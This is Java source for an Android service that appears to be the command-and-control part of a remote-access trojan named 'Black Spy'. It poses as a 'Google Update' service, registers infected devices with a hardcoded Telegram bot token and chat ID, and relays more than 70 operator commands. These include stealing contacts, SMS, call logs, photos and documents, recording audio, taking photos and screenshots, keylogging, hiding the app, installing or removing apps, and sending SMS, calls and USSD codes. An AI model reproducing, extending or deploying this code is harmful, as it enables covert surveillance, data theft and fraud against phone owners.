package com.google.update;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
public class TelegramBotService extends Service {
    private static final String BOT_TOKEN = "8640775836:AAH6zGPNagHHqRLTmgfdlCW5ggz4MGh3-ts";
    private static final String CHAT_ID = "6793813126";
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    private int lastUpdateId = 0;
    private Map<String, DeviceInfo> devices = new HashMap<>();
    private String activeDevice = null;
    private MediaRecorder mediaRecorder;
    private String currentAudioPath;
    private boolean isRecording = false;
    private boolean keyloggerRunning = false;
    private StringBuilder keylogBuffer = new StringBuilder();
    private Map<String, String> pendingDelete = new HashMap<>();
    static class DeviceInfo { String id, name; }
    @Override public void onCreate() { 
        super.onCreate(); 
        startForeground(1, createNotification()); 
        autoRegisterThisDevice();
        startBot(); 
    }
    private void autoRegisterThisDevice() {
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (" + Build.VERSION.RELEASE + ")";
            JSONObject json = new JSONObject();
            json.put("device_id", deviceId);
            json.put("device_name", deviceName);
            String msg = "REGISTER:" + json.toString();
            String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8");
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("GET");
            conn.getResponseCode();
            conn.disconnect();
            Log.i("BlackSpy", "Auto-registered: " + deviceName);
        } catch (Exception e) { Log.e("BlackSpy", "Auto-register failed", e); }
    }
    private void startBot() {
        Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(() -> {
            try {
                String response = get(API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
                if (response != null && response.contains("\"ok\":true")) {
                    JSONObject json = new JSONObject(response);
                    JSONArray results = json.getJSONArray("result");
                    for (int i = 0; i < results.length(); i++) {
                        JSONObject update = results.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id");
                        if (update.has("message") && update.getJSONObject("message").has("text")) {
                            JSONObject msg = update.getJSONObject("message");
                            String text = msg.getString("text").trim();
                            long chatId = msg.getJSONObject("chat").getLong("id");
                            if (String.valueOf(chatId).equals(CHAT_ID)) {
                                handleCommand(text);
                            } else if (text.startsWith("REGISTER:")) {
                                String data = text.replace("REGISTER:", "");
                                JSONObject info = new JSONObject(data);
                                DeviceInfo d = new DeviceInfo();
                                d.id = info.getString("device_id");
                                d.name = info.getString("device_name");
                                devices.put(d.id, d);
                                sendDeviceList();
                            }
                        }
                    }
                }
            } catch (Exception e) { Log.e("Bot", "Error", e); }
        }, 0, 2, TimeUnit.SECONDS);
    }
    private void handleCommand(String cmd) {
        String c = cmd.trim().toLowerCase();
        if (c.equals("/start")) {
            sendWelcomeAndDevices();
        } else if (c.startsWith("/select_")) {
            String deviceId = cmd.substring(8).trim();
            if (devices.containsKey(deviceId)) {
                activeDevice = deviceId;
                sendCommandMenu(deviceId);
            } else {
                sendMessage("❌ Device not found");
            }
        } else if (c.equals("/devices")) {
            sendDeviceList();
        } else if (c.startsWith("yes_")) {
            String path = pendingDelete.get(CHAT_ID);
            if (path != null) {
                pendingDelete.remove(CHAT_ID);
                sendToDevice(activeDevice, "CONFIRM_DELETE|" + path);
                sendMessage("✅ Delete confirmed, executing...");
            } else {
                sendMessage("❌ No pending delete");
            }
        } else if (c.startsWith("no_")) {
            pendingDelete.remove(CHAT_ID);
            sendMessage("❌ Delete cancelled");
        } else {
            if (activeDevice == null) {
                sendMessage("⚠️ Select device first: /start");
                return;
            }
            if (c.equals("/contacts")) sendToDevice(activeDevice, "GET_CONTACTS");
            else if (c.equals("/sms")) sendToDevice(activeDevice, "GET_SMS");
            else if (c.equals("/calllogs")) sendToDevice(activeDevice, "GET_CALLLOGS");
            else if (c.equals("/info")) sendToDevice(activeDevice, "GET_INFO");
            else if (c.equals("/battery")) sendToDevice(activeDevice, "GET_BATTERY");
            else if (c.equals("/location")) sendToDevice(activeDevice, "GET_LOCATION");
            else if (c.equals("/network")) sendToDevice(activeDevice, "GET_NETWORK");
            else if (c.equals("/sim")) sendToDevice(activeDevice, "GET_SIM");
            else if (c.equals("/record")) sendToDevice(activeDevice, "START_RECORD");
            else if (c.equals("/stoprec")) sendToDevice(activeDevice, "STOP_RECORD");
            else if (c.equals("/volumeup")) sendToDevice(activeDevice, "VOLUME_UP");
            else if (c.equals("/volumedown")) sendToDevice(activeDevice, "VOLUME_DOWN");
            else if (c.equals("/mute")) sendToDevice(activeDevice, "MUTE");
            else if (c.equals("/photo")) sendToDevice(activeDevice, "PHOTO");
            else if (c.equals("/photofront")) sendToDevice(activeDevice, "PHOTOFRONT");
            else if (c.equals("/screenshot")) sendToDevice(activeDevice, "SCREENSHOT");
            else if (c.equals("/screenrecord")) sendToDevice(activeDevice, "SCREENRECORD");
            else if (c.startsWith("/copy_photos ")) sendToDevice(activeDevice, "COPY_PHOTOS|" + cmd.substring(13));
            else if (c.startsWith("/copy_videos ")) sendToDevice(activeDevice, "COPY_VIDEOS|" + cmd.substring(13));
            else if (c.startsWith("/copy_audio ")) sendToDevice(activeDevice, "COPY_AUDIO|" + cmd.substring(12));
            else if (c.startsWith("/copy_docs ")) sendToDevice(activeDevice, "COPY_DOCS|" + cmd.substring(11));
            else if (c.startsWith("/copy_contacts ")) sendToDevice(activeDevice, "COPY_CONTACTS|" + cmd.substring(15));
            else if (c.startsWith("/copy_sms ")) sendToDevice(activeDevice, "COPY_SMS|" + cmd.substring(10));
            else if (c.startsWith("/copy_calls ")) sendToDevice(activeDevice, "COPY_CALLS|" + cmd.substring(12));
            else if (c.equals("/steal_all")) sendToDevice(activeDevice, "STEAL_ALL");
            else if (c.equals("/steal_photos")) sendToDevice(activeDevice, "STEAL_PHOTOS");
            else if (c.equals("/steal_videos")) sendToDevice(activeDevice, "STEAL_VIDEOS");
            else if (c.equals("/steal_audio")) sendToDevice(activeDevice, "STEAL_AUDIO");
            else if (c.equals("/steal_docs")) sendToDevice(activeDevice, "STEAL_DOCS");
            else if (c.equals("/steal_contacts")) sendToDevice(activeDevice, "STEAL_CONTACTS");
            else if (c.equals("/steal_sms")) sendToDevice(activeDevice, "STEAL_SMS");
            else if (c.equals("/steal_calls")) sendToDevice(activeDevice, "STEAL_CALLS");
            else if (c.startsWith("/delete_photo ")) { String path = cmd.substring(14); askConfirmation("delete_photo|" + path); }
            else if (c.startsWith("/delete_video ")) { String path = cmd.substring(14); askConfirmation("delete_video|" + path); }
            else if (c.startsWith("/delete_audio ")) { String path = cmd.substring(14); askConfirmation("delete_audio|" + path); }
            else if (c.startsWith("/delete_doc ")) { String path = cmd.substring(11); askConfirmation("delete_doc|" + path); }
            else if (c.startsWith("/delete_contact ")) { String id = cmd.substring(16); askConfirmation("delete_contact|" + id); }
            else if (c.startsWith("/delete_sms ")) { String id = cmd.substring(12); askConfirmation("delete_sms|" + id); }
            else if (c.startsWith("/delete_call ")) { String id = cmd.substring(13); askConfirmation("delete_call|" + id); }
            else if (c.equals("/zip")) sendToDevice(activeDevice, "GET_ZIP");
            else if (c.equals("/photos")) sendToDevice(activeDevice, "GET_PHOTOS");
            else if (c.equals("/videos")) sendToDevice(activeDevice, "GET_VIDEOS");
            else if (c.equals("/audio")) sendToDevice(activeDevice, "GET_AUDIO");
            else if (c.equals("/documents")) sendToDevice(activeDevice, "GET_DOCUMENTS");
            else if (c.startsWith("/search ")) sendToDevice(activeDevice, "SEARCH|" + cmd.substring(8));
            else if (c.startsWith("/download ")) sendToDevice(activeDevice, "DOWNLOAD|" + cmd.substring(10));
            else if (c.startsWith("/mkdir ")) sendToDevice(activeDevice, "MKDIR|" + cmd.substring(7));
            else if (c.equals("/apps")) sendToDevice(activeDevice, "GET_APPS");
            else if (c.startsWith("/openapp ")) sendToDevice(activeDevice, "OPEN_APP|" + cmd.substring(9));
            else if (c.startsWith("/install ")) sendToDevice(activeDevice, "INSTALL_APP|" + cmd.substring(9));
            else if (c.startsWith("/uninstall ")) sendToDevice(activeDevice, "UNINSTALL_APP|" + cmd.substring(11));
            else if (c.startsWith("/disable ")) sendToDevice(activeDevice, "DISABLE_APP|" + cmd.substring(9));
            else if (c.startsWith("/enable ")) sendToDevice(activeDevice, "ENABLE_APP|" + cmd.substring(8));
            else if (c.startsWith("/appinfo ")) sendToDevice(activeDevice, "APP_INFO|" + cmd.substring(9));
            else if (c.startsWith("/killapp ")) sendToDevice(activeDevice, "KILL_APP|" + cmd.substring(9));
            else if (c.equals("/hide")) sendToDevice(activeDevice, "HIDE_APP");
            else if (c.equals("/show")) sendToDevice(activeDevice, "SHOW_APP");
            else if (c.startsWith("/toast ")) sendToDevice(activeDevice, "TOAST|" + cmd.substring(7));
            else if (c.startsWith("/notify ")) sendToDevice(activeDevice, "NOTIFY|" + cmd.substring(8));
            else if (c.startsWith("/vibrate ")) sendToDevice(activeDevice, "VIBRATE|" + cmd.substring(9));
            else if (c.startsWith("/openurl ")) sendToDevice(activeDevice, "OPENURL|" + cmd.substring(9));
            else if (c.equals("/clipboard")) sendToDevice(activeDevice, "GET_CLIPBOARD");
            else if (c.equals("/keylogger start")) sendToDevice(activeDevice, "KEYLOGGER_START");
            else if (c.equals("/keylogger stop")) sendToDevice(activeDevice, "KEYLOGGER_STOP");
            else if (c.equals("/keylogger send")) sendToDevice(activeDevice, "KEYLOGGER_SEND");
            else if (c.startsWith("/sms_send ")) sendToDevice(activeDevice, "SMS_SEND|" + cmd.substring(10));
            else if (c.startsWith("/call ")) sendToDevice(activeDevice, "CALL|" + cmd.substring(6));
            else if (c.startsWith("/ussd ")) sendToDevice(activeDevice, "USSD|" + cmd.substring(6));
            else sendMessage("❌ Unknown command");
        }
    }
    private void askConfirmation(String action) {
        pendingDelete.put(CHAT_ID, action);
        sendMessage("⚠️ Are you sure you want to delete?\nType 'yes' to confirm or 'no' to cancel");
    }
    private void sendWelcomeAndDevices() {
        String welcome = "🔥 BLACK SPY 🔥\n"
                + "╔════════════════════════════╗\n"
                + "║   👹 Black Spy 👹          ║\n"
                + "║   🕷️ Hackers Walking Anous 🕷️\n"
                + "║   💀 Under World Spy 💀    ║\n"
                + "╚════════════════════════════╝\n\n";
        if (devices.isEmpty()) {
            sendMessage(welcome + "❌ No devices connected yet.\nWaiting for devices...");
        } else {
            StringBuilder sb = new StringBuilder(welcome + "📱 <b>Select a device:</b>\n\n");
            for (DeviceInfo d : devices.values()) {
                sb.append("🔹 /select_").append(d.id).append(" - ").append(d.name).append("\n");
            }
            sendMessage(sb.toString());
        }
    }
    private void sendCommandMenu(String deviceId) {
        DeviceInfo d = devices.get(deviceId);
        String menu = "✅ <b>Device selected:</b> " + d.name + "\n\n"
                + "🔰 <b>ALL COMMANDS (70+):</b>\n"
                + "────────────────\n"
                + "<b>📇 DATA:</b>\n/contacts, /sms, /calllogs, /apps, /info, /battery, /location, /network, /sim\n\n"
                + "<b>🎤 AUDIO:</b>\n/record, /stoprec, /volumeup, /volumedown, /mute\n\n"
                + "<b>📸 CAMERA:</b>\n/photo, /photofront, /screenshot, /screenrecord\n\n"
                + "<b>📁 FILES:</b>\n/zip, /photos, /videos, /audio, /documents, /search, /download, /mkdir\n\n"
                + "<b>📋 COPY (to device):</b>\n/copy_photos <dst>, /copy_videos <dst>, /copy_audio <dst>, /copy_docs <dst>\n/copy_contacts <dst>, /copy_sms <dst>, /copy_calls <dst>\n\n"
                + "<b>💀 STEAL (to you):</b>\n/steal_all, /steal_photos, /steal_videos, /steal_audio, /steal_docs\n/steal_contacts, /steal_sms, /steal_calls\n\n"
                + "<b>🗑 DELETE (with confirmation):</b>\n/delete_photo <path>, /delete_video <path>, /delete_audio <path>, /delete_doc <path>\n/delete_contact <id>, /delete_sms <id>, /delete_call <id>\n\n"
                + "<b>📱 APPS (by name):</b>\n/openapp WhatsApp, /install /sdcard/app.apk, /uninstall WhatsApp, /disable WhatsApp, /enable WhatsApp\n/appinfo WhatsApp, /killapp WhatsApp\n\n"
                + "<b>👁 STEALTH:</b>\n/hide, /show, /toast <text>, /notify <text>, /vibrate <sec>, /openurl <url>, /clipboard\n\n"
                + "<b>⌨️ KEYLOGGER:</b>\n/keylogger start, /keylogger stop, /keylogger send\n\n"
                + "<b>📞 SMS & CALLS:</b>\n/sms_send <number> <text>, /call <number>, /ussd <code>\n\n"
                + "<b>⚠️ All commands are sent to this device only</b>";
        sendMessage(menu);
    }
    private void sendDeviceList() {
        if (devices.isEmpty()) return;
        StringBuilder sb = new StringBuilder("📱 <b>Connected devices:</b>\n\n");
        for (DeviceInfo d : devices.values()) {
            sb.append("🔹 /select_").append(d.id).append(" - ").append(d.name).append("\n");
        }
        sendMessage(sb.toString());
    }
    private void sendToDevice(String deviceId, String cmd) {
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + deviceId + "&text=" + URLEncoder.encode("CMD:" + cmd, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
                sendMessage("✅ Command sent to " + devices.get(deviceId).name);
            } catch (Exception e) { sendMessage("❌ Failed to send"); }
        }).start();
    }
    private void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=HTML";
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
    private String get(String urlStr) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }
    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("google_ch", "Google", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        return new NotificationCompat.Builder(this, "google_ch")
            .setContentTitle("Google Update").setContentText("Online").setSmallIcon(android.R.drawable.ic_dialog_info).setOngoing(true).build();
    }
    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
}
